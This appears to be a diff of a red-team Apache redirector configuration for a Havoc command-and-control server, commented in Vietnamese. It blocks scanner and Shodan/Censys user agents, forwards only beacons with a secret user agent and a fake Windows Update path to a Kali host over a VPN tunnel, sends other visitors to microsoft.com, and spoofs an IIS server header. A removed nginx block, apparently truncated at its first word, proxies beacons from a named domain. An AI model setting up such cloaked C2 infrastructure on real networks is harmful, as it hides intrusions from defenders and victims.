@@ -1,64 +1,34 @@
-# ----------------------------------------------------------------------
-# HAVOC C2 REDIRECTOR CONFIGURATION
-# ----------------------------------------------------------------------
+###########################################################
+# RED TEAM REDIRECTOR - APACHE CONFIGURATION
+###########################################################
 
 RewriteEngine On
 
-# [PHẦN 1] - CHẶN CÁC MÁY QUÉT VÀ SOC (BLOCKING)
-# Chặn các User-Agent phổ biến của các công cụ scan (Nmap, Nikto, Nessus...)
-RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap).* [NC]
+# [PHẦN 1] - ANTI-ANALYSIS & CLOAKING
+# Chặn các User-Agent từ các máy quét tự động và giới phân tích
+RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap|censys|shodan).* [NC]
 RewriteRule ^.*$ - [F,L]
 
-# [PHẦN 2] - ĐIỀU KIỆN NHẬN DIỆN BEACON (VALIDATION)
-# Điều kiện 1: User-Agent phải khớp chính xác với Profile Havoc của bạn
+# [PHẦN 2] - ĐIỀU KIỆN LỌC BEACON (CONDITIONAL REDIRECTION)
+# Chỉ những Request thỏa mãn đồng thời 2 điều kiện dưới đây mới được vào C2
+# 1. Khớp User-Agent bí mật (đã cài đặt trong Havoc)
 RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]
 
-# Điều kiện 2: URI phải nằm trong danh sách trắng (Whitelist URIs)
-# Ở đây tôi dùng regex để khớp với các đường dẫn Microsoft Update giả lập
-RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [OR]
-RewriteCond %{REQUEST_URI} ^/p/v1/win/updates/.*
+# 2. Khớp URI giả lập Windows Update
+RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]
 
-# [PHẦN 3] - HÀNH ĐỘNG: ĐẨY VÀO VPN TUNNEL (PROXY)
-# Nếu thỏa mãn các điều kiện trên, Apache sẽ đóng vai trò Proxy đẩy về Kali 2
+# [PHẦN 3] - PROXY VÀO VPN TUNNEL
+# Đẩy traffic qua interface tun0 tới Kali 2
 # [P] = Proxy, [L] = Last Rule, [NE] = No Escape
 RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]
 
-# [PHẦN 4] - GIẢ DẠNG (DECOY/CLOAKING)
-# Nếu KHÔNG thỏa mãn điều kiện (người lạ truy cập), chuyển hướng về trang uy tín
-# Bạn có thể thay đổi link này thành website công ty thật để ngụy trang
+# [PHẦN 4] - FALLBACK (MẶT NẠ CHO SOC/GUEST)
+# Tất cả các truy cập không hợp lệ sẽ bị đẩy về website thật của Microsoft
 RewriteRule ^.*$ https://www.microsoft.com [R=302,L]
 
-# [PHẦN 5] - BẢO MẬT BỔ SUNG
-# Xóa các Header tiết lộ thông tin của Apache/PHP
+# [PHẦN 5] - XÓA DẤU VẾT SERVER (FINGERPRINTING)
+# Giả dạng Apache thành IIS 10.0 của Windows Server
 Header unset X-Powered-By
+Header unset Server
 Header set Server "Microsoft-IIS/10.0"
-
-
-
-
-
-
-ap $http_user_agent $is_havoc {
-    default 0;
-    "~*Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0" 1; 
-}
-
-server {
-    listen 80; # Cổng nhận beacon
-    server_name net.mytotobanservice.info;
-
-    location / {
-        # Nếu không đúng User-Agent -> Chuyển hướng sang Google (giả vờ là khách thường)
-        if ($is_havoc = 0) {
-            return 301 https://www.google.com;
-        }
-
-        # Nếu đúng User-Agent và đúng URI bí mật -> Đẩy về Kali 2
-        location ~* ^/msdownload/update/v3/static/ {
-            proxy_pass http://192.168.209.128:8080; # IP của Kali 2
-            proxy_set_header Host $host;
-            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        }
-    }
-}
-
+Header set X-Content-Type-Options "nosniff"
